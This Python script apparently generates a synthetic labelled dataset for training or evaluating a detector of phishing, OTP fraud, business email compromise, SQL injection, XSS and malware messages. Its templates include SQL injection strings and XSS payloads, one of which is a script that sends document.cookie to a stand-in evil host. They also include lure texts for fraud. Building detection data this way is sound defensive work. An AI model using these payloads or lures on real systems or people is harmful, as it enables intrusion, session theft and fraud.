# CONTRIBUTION: Builds professional 2000-row set (full names, full sentences).
"""Professional dataset v2: id,title,body,label,label_full,severity.

RUN: .venv\\Scripts\\python data/eval/build_2000.py [--n 2000]
OUT: data/eval/labels2000.csv (synthetic-v2 disclosed; replace with real mail later)
"""
import argparse
import csv
import random
from pathlib import Path

OUT = Path(__file__).parent / "labels2000_v2.csv"
PEOPLE = ["Koushiq Ahmed", "Tumpa Akter", "Rahim Uddin", "Ovi Hasan",
          "Rio Chowdhury", "Nadia Islam", "Farhan Karim", "Mim Akter"]
FULL = {
    "phishing": "Phishing (Generic Deception)",
    "otp": "OTP / Vishing Fraud",
    "bec": "Business Email Compromise",
    "sqli": "SQL Injection",
    "xss": "Cross-Site Scripting",
    "malware": "Malware / Ransomware",
    "safe": "Benign (Safe Communication)",
}
SEV = {"phishing": "high", "otp": "high", "bec": "high", "sqli": "high",
       "xss": "high", "malware": "high", "safe": "low"}

TMPL = {
    "phishing": [
        ("Urgent Account Verification Required for {p}",
         "Dear {p}, Your account shows unusual activity and will be suspended within 24 hours. "
         "Please verify immediately at http://secure-verify.{d}.com/login using your password. Regards, Security Team."),
        ("Password Reset Confirmation for {p}",
         "Hello {p}, A password reset was requested. Confirm at http://{d}.com/reset within 2 hours "
         "or your access will be locked. Do not ignore this notice. Regards, IT Support."),
        ("Congratulations {p}, You Have Won a Prize",
         "Dear {p}, You have been selected as a lottery winner of BDT {a}. "
         "Claim now by sharing your one-time password at http://claims.{d}.com. Regards, Rewards Desk."),
    ],
    "otp": [
        ("One-Time Password Required for Parcel Delivery to {p}",
         "Hello {p}, Your parcel is held at the depot. Please share the OTP sent to your phone ({a}) "
         "to release it today. Regards, Courier Service."),
        ("WhatsApp Verification Code Request for {p}",
         "Hi {p}, This is the delivery team on WhatsApp ({d}). Please reply with your OTP "
         "so we can confirm your order. Regards, Dispatch Team."),
        ("Missed Call Voicemail: Verify Account for {p}",
         "Dear {p}, You missed a call from our verification desk. Please call back on {a} "
         "and provide your OTP to unblock your card. Regards, Bank Helpline."),
    ],
    "bec": [
        ("Revised Wire Instructions for Invoice BDT {a} ({p})",
         "Dear {p}, Our vendor bank details have changed. Please wire BDT {a} to the updated account "
         "today. This is confidential per CEO instruction. Regards, Finance Department."),
        ("Urgent Gift Card Purchase Request from Management ({p})",
         "Hello {p}, Management requests five Google Play cards worth BDT {a} for a client gift. "
         "Please purchase and email the codes immediately. Regards, Executive Office."),
        ("Overdue Supplier Payment of BDT {a} for {p}",
         "Dear {p}, Supplier payment of BDT {a} is overdue and incurs penalty. "
         "Transfer today to the attached account and confirm. Regards, Accounts Payable."),
    ],
    "sqli": [
        ("Admission Portal Login Bypass Attempt by {p}",
         "Test input for {p}: username admin'-- with any password logged in as administrator "
         "without password on the admission portal. Regards, QA Team."),
        ("Fee Search Field Returned Card Records for {p}",
         "Input by {p}: ' UNION SELECT card_number, cvv FROM payments -- dumped card data "
         "on screen for amount BDT {a}. Regards, Audit Log."),
        ("Grade Record Modified via Student ID Field ({p})",
         "Entry for {p}: 101'; UPDATE students SET gpa=4.0 WHERE id=101; -- grades changed. Regards, System Log."),
    ],
    "xss": [
        ("Wall Post Embedded Script Reported by {p}",
         "Post by {p} contained <script>fetch('http://evil.{d}.com?c='+document.cookie)</script> "
         "which leaked friend sessions. Regards, Moderation Queue."),
        ("Feedback Form Keylogger Pattern from {p}",
         "Input from {p}: <img src=x onerror=alert(document.domain)> opened a fake login popup. Regards, Web Filter."),
        ("Product Review Redirect Link Flagged for {p}",
         "Review by {p} held <a href=\"javascript:alert(document.cookie)\">discount link</a> "
         "stealing cookies. Regards, Trust Team."),
    ],
    "malware": [
        ("Invoice Attachment statement.exe Sent to {p}",
         "Dear {p}, Please open the attached statement.exe to view invoice BDT {a}. "
         "Run the file to display the statement. Regards, Billing Desk."),
        ("Reward App Install Link for {p}",
         "Hi {p}, Claim your reward by installing reward.apk from http://bit.ly/{a} today. Regards, Promo Team."),
        ("Ransomware Decryption Notice for {p}",
         "Attention {p}: Your files have been encrypted. Pay the specified bitcoin amount ({a}) "
         "to receive the decryption key. Regards, Unknown Sender."),
    ],
    "safe": [
        ("Team Lunch on Friday for {p}",
         "Hi {p}, Reminder that the team lunch is at the usual restaurant on Friday afternoon. "
         "Please confirm attendance. Regards, HR Department."),
        ("Spring Class Routine Published for {p}",
         "Dear {p}, The spring class routine is published on notice board 501. "
         "Please check your section timing. Regards, Academic Office."),
        ("Library Extended Hours During Exams ({p})",
         "Hello {p}, The central library stays open until 8:00 PM during exams. "
         "Please carry your student ID card. Regards, Library Desk."),
    ],
}
DOMS = ["notice", "verify", "secure", "portal", "service"]
AMTS = ["12,500", "47,000", "8,900", "1,20,000", "5,499"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=2000)
    a = ap.parse_args()
    random.seed(42)
    kinds = list(TMPL)
    per = a.n // len(kinds)
    rows, i = [], 0
    for k in kinds:
        for _ in range(per):
            i += 1
            t, b = random.choice(TMPL[k])
            p = random.choice(PEOPLE)
            kw = {"p": p, "d": random.choice(DOMS), "a": random.choice(AMTS)}
            rows.append({"id": f"FLG-{i:05d}", "title": t.format(**kw), "body": b.format(**kw),
                         "label": k, "label_full": FULL[k], "severity": SEV[k]})
    random.shuffle(rows)
    for j, r in enumerate(rows, 1):
        r["id"] = f"FLG-{j:05d}"
    with open(OUT, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["id", "title", "body", "label", "label_full", "severity"])
        w.writeheader()
        w.writerows(rows)
    print(f"wrote {OUT} ({len(rows)} rows, professional v2, synthetic disclosed)")


if __name__ == "__main__":
    main()
